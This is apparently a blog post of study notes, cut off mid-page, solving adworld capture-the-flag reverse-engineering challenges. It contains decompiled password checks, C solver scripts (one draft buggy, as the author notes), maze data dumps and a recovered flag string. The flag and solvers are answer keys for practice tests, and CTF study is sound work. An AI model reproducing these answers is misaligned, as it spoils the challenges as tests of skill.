            "content_html": "<h1 id=\"adworld\"><a href=\"#adworld\" class=\"headerlink\" title=\"adworld\"></a>adworld</h1><h2 id=\"简单题-1\"><a href=\"#简单题-1\" class=\"headerlink\" title=\"简单题 1\"></a>简单题 1</h2><h3 id=\"Reversing-x64Elf-100\"><a href=\"#Reversing-x64Elf-100\" class=\"headerlink\" title=\"Reversing-x64Elf-100\"></a>Reversing-x64Elf-100</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">264</span>]; <span class=\"comment\">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+108h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter the password: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !fgets(s, <span class=\"number\">255</span>, <span class=\"built_in\">stdin</span>) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)sub_4006FD(s) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect password!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Nice!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_4006FD</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-24h]</span></span><br><span class=\"line\">  __int64 v3[<span class=\"number\">4</span>]; <span class=\"comment\">// [rsp+18h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3[<span class=\"number\">0</span>] = (__int64)<span class=\"string\">&quot;Dufhbmf&quot;</span>;</span><br><span class=\"line\">  v3[<span class=\"number\">1</span>] = (__int64)<span class=\"string\">&quot;pG`imos&quot;</span>;</span><br><span class=\"line\">  v3[<span class=\"number\">2</span>] = (__int64)<span class=\"string\">&quot;ewUglpt&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">11</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(<span class=\"type\">char</span> *)(v3[i % <span class=\"number\">3</span>] + <span class=\"number\">2</span> * (i / <span class=\"number\">3</span>)) - *(<span class=\"type\">char</span> *)(i + a1) != <span class=\"number\">1</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>*(char *)(v3[i % 3] + 2 * (i &#x2F; 3)) - *(char *)(i + a1) !&#x3D; 1</p>\n<p>重点是这一句</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"><span class=\"type\">char</span> v3[] = <span class=\"string\">&quot;DufhbmfpG`imosewUglpt&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> a;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">11</span>;i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> a =  v3[i%<span class=\"number\">3</span>] + <span class=\"number\">2</span>*(i/<span class=\"number\">3</span>) - <span class=\"number\">1</span>-i;</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>,a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>理解的不对,这其实是一个二维的,所以说你看到的东西并不是简单的直接反向操作就可以了,还是需要进行加工的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"><span class=\"type\">char</span> v3[] = <span class=\"string\">&quot;DufhbmfpG`imosewUglpt&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> a;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">12</span>;i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> a =  v3[i%<span class=\"number\">3</span>][<span class=\"number\">2</span>*(i/<span class=\"number\">3</span>)] - <span class=\"number\">1</span>-i;</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>,a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意位数</p>\n<p>Code_Talkers</p>\n<h3 id=\"666\"><a href=\"#666\" class=\"headerlink\" title=\"666\"></a>666</h3><p>dd是什么</p>\n<p>key为什么是18</p>\n<p>izwhroz””w”v.K”.Ni 这个东西逆向</p>\n<p>重点是下面这段代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; key; i += <span class=\"number\">3</span> )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   v3[i + <span class=\"number\">64</span>] = key ^ (a1[i] + <span class=\"number\">6</span>);</span><br><span class=\"line\">   v3[i + <span class=\"number\">33</span>] = (a1[i + <span class=\"number\">1</span>] - <span class=\"number\">6</span>) ^ key;</span><br><span class=\"line\">   v3[i + <span class=\"number\">2</span>] = a1[i + <span class=\"number\">2</span>] ^ <span class=\"number\">6</span> ^ key;</span><br><span class=\"line\">   *(_BYTE *)(a2 + i) = v3[i + <span class=\"number\">64</span>];</span><br><span class=\"line\">   *(_BYTE *)(a2 + i + <span class=\"number\">1LL</span>) = v3[i + <span class=\"number\">33</span>];</span><br><span class=\"line\">   *(_BYTE *)(a2 + i + <span class=\"number\">2LL</span>) = v3[i + <span class=\"number\">2</span>];</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> key = <span class=\"number\">0x12</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> a2[<span class=\"number\">50</span>] = <span class=\"string\">&#x27;izwhroz&quot;&quot;w&quot;v.K&quot;.Ni&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">18</span>; i += <span class=\"number\">3</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    a2[i] = <span class=\"number\">0x12</span> ^ (flag[i] + <span class=\"number\">6</span>);</span><br><span class=\"line\">    a2[i+<span class=\"number\">1</span>] = (flag[i + <span class=\"number\">1</span>] - <span class=\"number\">6</span>) ^ key;</span><br><span class=\"line\">    a2[i+<span class=\"number\">2</span>] =  flag[i + <span class=\"number\">2</span>] ^ <span class=\"number\">6</span> ^ key;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> key = <span class=\"number\">0x12</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> a2[<span class=\"number\">50</span>] = <span class=\"string\">&quot;izwhroz\\&quot;\\&quot;w\\&quot;v.K\\&quot;.Ni&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> flag[<span class=\"number\">50</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">18</span>; i += <span class=\"number\">3</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">     flag[i]= (a2[i]^<span class=\"number\">0x12</span>) - <span class=\"number\">6</span> ;</span><br><span class=\"line\">     flag[i + <span class=\"number\">1</span>]=  (a2[i+<span class=\"number\">1</span>]^key) + <span class=\"number\">6</span> ;</span><br><span class=\"line\">     flag[i + <span class=\"number\">2</span>] =  a2[i+<span class=\"number\">2</span>]^ <span class=\"number\">6</span> ^ key ;</span><br><span class=\"line\">  \t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>,flag[i]);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>,flag[i+<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>,flag[i+<span class=\"number\">2</span>]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里要注意异或和加减的优先级</p>\n<p>unctf{b66_6b6_66b}</p>\n<h3 id=\"reverse-re3\"><a href=\"#reverse-re3\" class=\"headerlink\" title=\"reverse_re3\"></a>reverse_re3</h3><p>​\t\t迷宫题,一开始看不懂</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:<span class=\"number\">0000000000202020</span> dword_202020    dd <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">0</span>Ah <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 5 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 3, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 6 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span><br><span class=\"line\">.data:0000000000202020                                         ; DATA XREF: sub_86C+<span class=\"number\">82</span>↑o</span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                                         ; sub_A92+<span class=\"number\">76</span>↑o ...</span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">3</span> dup(<span class=\"number\">0</span>), <span class=\"number\">1</span>, <span class=\"number\">6</span> dup(<span class=\"number\">0</span>), <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">3</span> dup(<span class=\"number\">0</span>)</span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">6</span> dup(<span class=\"number\">0</span>), <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">3</span> dup(<span class=\"number\">0</span>), <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">2</span> dup(<span class=\"number\">0</span>)</span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">7</span> dup(<span class=\"number\">0</span>), <span class=\"number\">1</span>, <span class=\"number\">2</span> dup(<span class=\"number\">0</span>), <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">7</span> dup(<span class=\"number\">0</span>)</span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">2</span> dup(<span class=\"number\">0</span>), <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">7</span> dup(<span class=\"number\">0</span>), <span class=\"number\">2</span> dup(<span class=\"number\">1</span>), <span class=\"number\">0</span>, <span class=\"number\">5</span> dup(<span class=\"number\">1</span>)</span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">8</span> dup(<span class=\"number\">0</span>), <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span> dup(<span class=\"number\">1</span>), <span class=\"number\">8</span> dup(<span class=\"number\">0</span>), <span class=\"number\">4</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>Dh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 0Dh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 3, 5 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 6 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 3 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 6 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 6 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 1, 6 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 3 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 5 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 7 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 7 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 5 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 4 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 5 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 5 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 4 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 6 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 1</span><br><span class=\"line\">.data:0000000000202020                 dd 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 0Bh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 0Bh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 4, 0, 1Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 10h <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 3, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 0, 3 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0Ah <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 3 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0</span><br><span class=\"line\">.data:0000000000202020                 dd 1, 0Bh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 8 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0</span><br><span class=\"line\">.data:0000000000202020                 dd 1, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 9 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 3 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 2 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 1, 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 4 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 1, 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 1, 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 4 <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">1</span>)</span>, 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span><br><span class=\"line\">.data:0000000000202020                 dd 1, 0Eh <span class=\"title function_\">dup</span><span class=\"params\">(<span class=\"number\">0</span>)</span>, 4, 0</span><br><span class=\"line\">.data:0000000000202020 _data           ends</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">要调整一下格式</span><br><span class=\"line\">data:0000000000202020 dword_202020    dd 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class=\"line\">.data:0000000000202020                                         ; DATA XREF: sub_86C+<span class=\"number\">82</span>↑o</span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                                         ; sub_A92+<span class=\"number\">76</span>↑o ...</span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">.data:<span class=\"number\">0000000000202020</span>                 dd <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span 